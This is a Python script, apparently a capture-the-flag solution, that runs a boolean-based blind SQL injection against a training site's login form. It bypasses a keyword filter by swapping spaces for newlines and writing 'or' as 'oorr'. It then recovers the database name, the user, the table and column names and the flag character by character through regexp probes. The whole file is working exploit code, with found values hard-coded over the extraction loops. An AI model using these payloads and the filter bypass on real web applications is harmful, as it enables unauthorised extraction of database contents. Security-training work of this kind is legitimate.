# -*- coding:utf8 -*-


import requests
import string
import time

def payload(rawstr):
    newstr=rawstr.replace(' ',chr(0x0a)).replace('or','oorr')
    return newstr


def foo():
    url=r'http://ctf5.shiyanbar.com/web/earnest/index.php'
    mys=requests.session()
    cset=string.digits+string.lowercase+'!_{}@~.'
    true_state='You are in'

    lens=0
    i=1
    model="0' or length(database())=%d or 'pcat'='"
    while True:
        tmp= model %(i)
        myd={'id':payload(tmp),}
        res=mys.post(url,data=myd).content
        if true_state in res:
            lens=i
            break
        i+=1
        pass
    lens=18
    print("[+]length(database()): %d" %(lens))

    strs=''
    model="0' or (select database() regexp '%s$') or 'pcat'='"
    for i in range(lens):
        for c in cset:
            tmp=model %(c+strs)
            myd={'id':payload(tmp),}
            res=mys.post(url,data=myd).content
            if true_state in res:
                strs=c+strs
                print strs
                break
        pass
    pass
    strs='ctf_sql_bool_blind'
    print("[+]database():%s" %(strs))


    lens=0
    i=1
    model="0' or length(user())=%d or 'pcat'='"
    while True:
        tmp= model %(i)
        myd={'id':payload(tmp),}
        res=mys.post(url,data=myd).content
        if true_state in res:
            lens=i
            break
        i+=1
        pass
    lens=14
    print("[+]length(user()): %d" %(lens))

    strs=''
    model="0' or (select user() regexp '%s$') or 'pcat'='"
    for i in range(lens):
        for c in cset:
            tmp=model %(c+strs)
            myd={'id':payload(tmp),}
            res=mys.post(url,data=myd).content
            if true_state in res:
                strs=c+strs
                print strs
                break
        pass
    pass
    strs='web7@localhost'
    print("[+]user():%s" %(strs))



    lens=0
    i=1
    model="0' or length((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1))=%d or 'pcat'='"
    while True:
        tmp= model %(i)
        myd={'id':payload(tmp),}
        res=mys.post(url,data=myd).content
        if true_state in res:
            lens=i
            break
        i+=1
        pass
    lens=10
    print("[+]length(group_concat(table_name separator '@')): %d" %(lens))

    strs=''
    model="0' or (select (select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1) regexp '%s$') or 'pcat'='"
    for i in range(lens):
        for c in cset:
            tmp=model %(c+strs)
            myd={'id':payload(tmp),}
            res=mys.post(url,data=myd).content
            if true_state in res:
                strs=c+strs
                print strs
                break
        pass
    pass
    strs='fiag@users'
    print("[+]group_concat(table_name separator '@'):%s" %(strs))


    lens=0
    i=1
    model="0' or length((select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1))=%d or 'pcat'='"
    while True:
        tmp= model %(i)
        myd={'id':payload(tmp),}
        res=mys.post(url,data=myd).content
        if true_state in res:
            lens=i
            break
        i+=1
        pass
    lens=5
    print("[+]length(group_concat(column_name separator '@')): %d" %(lens))

    strs=''
    model="0' or (select (select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1) regexp '%s$') or 'pcat'='"
    for i in range(lens):
        for c in cset:
            tmp=model %(c+strs)
            myd={'id':payload(tmp),}
            res=mys.post(url,data=myd).content
            if true_state in res:
                strs=c+strs
                print strs
                break
        pass
    pass
    # get fl.4g maybe is fl.4g or f1$4g
    strs='fl$4g'
    print("[+]group_concat(column_name separator '@'):%s" %(strs))


    lens=0
    i=1
    model="0' or length((select fl$4g from fiag limit 1))=%d or 'pcat'='"
    while True:
        tmp= model %(i)
        myd={'id':payload(tmp),}
        res=mys.post(url,data=myd).content
        if true_state in res:
            lens=i
            break
        i+=1
        pass
    lens=19
    print("[+]length(fl$4g): %d" %(lens))

    strs=''
    model="0' or (select (select fl$4g from fiag limit 1) regexp '%s$') or 'pcat'='"
    for i in range(lens):
        for c in cset:
            tmp=model %(c+strs)
            myd={'id':payload(tmp),}
            res=mys.post(url,data=myd).content
            if true_state in res:
                strs=c+strs
                print strs
                break
        pass
    pass
    # get flag{haha~you.win!}
    strs='flag{haha~you win!}'
    print("[+]fl$4g:%s" %(strs))
    pass

if __name__ == '__main__':
    foo()
    print 'ok'

